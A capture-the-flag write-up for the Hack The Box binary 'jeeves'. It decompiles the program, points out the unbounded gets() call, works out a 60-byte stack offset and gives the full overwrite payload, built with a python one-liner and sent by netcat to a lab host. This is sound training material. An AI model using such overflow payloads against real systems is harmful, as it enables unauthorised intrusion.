# Analysis

  

```shell

┌──(kali㉿kali)-[~/Desktop/HTB_BE_track]
└─$ file jeeves
jeeves: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=18c31354ce48c8d63267a9a807f1799988af27bf, for GNU/Linux 3.2.0, not stripped

```
- 64 bit
- Not Stripped

---

## Ghidra Decompile

```c

target = -0x21523f2d;
printf("Hello, good sir!\nMay I have your name? ");
gets(input);
printf("Hello %s, hope you have a good day!\n",input);

if (target == 0x1337bab3) {
	local_18 = malloc(0x100);
	local_1c = open("flag.txt",0);
	read(local_1c,local_18,0x100);
	printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",local_18);
	close(local_1c);
}

```

**gets** function is used here which is vulnerable to **BOF** attacks since it don't check the size of input.

**target** variable value is being checked if it's equal to `0x1337bab3` then we can read the Flag.

But in code **target** is assigned value `-0x21523f2d`.It seems to be signed integer but in assemble we can see the real picture

```assembly
MOV dword ptr [RBP + target],0xdeadc0d3
```

Checking the Stack:

```text
Stack[-0xc]:4 target
Stack[-0x18]:8 local_18
Stack[-0x1c]:4 local_1c
Stack[-0x48] input
```

Since `input` is above the `target` in stack we can overflow and change the value in `target`


---

# Exploitation

First we need the offset. We can see in stack that **input** variable starts from `48` below **rbp** can **target** starts from `c` and the difference is `60` bytes.So our payload should be something like

```text
<60bytes random> + <Desired_value>
```

Use pwntools to arrange our desired value

```python
p64(0x1337bab3)
```

Now creating our payload

```shell
┌──(kali㉿kali)-[~/Desktop/HTB_BE_track]
└─$ python2 -c "print('a'*60 + '\xb3\xba7\x13\x00\x00\x00\x00')" > pay

┌──(kali㉿kali)-[~/Desktop/HTB_BE_track]
└─$ nc 64.227.39.88 31654 < pay

```

> Used python3 for pwntools :| to format the value accoring to 64bit arc (p64 function)
> And used python2 for creating final payload since python3 was having some issues
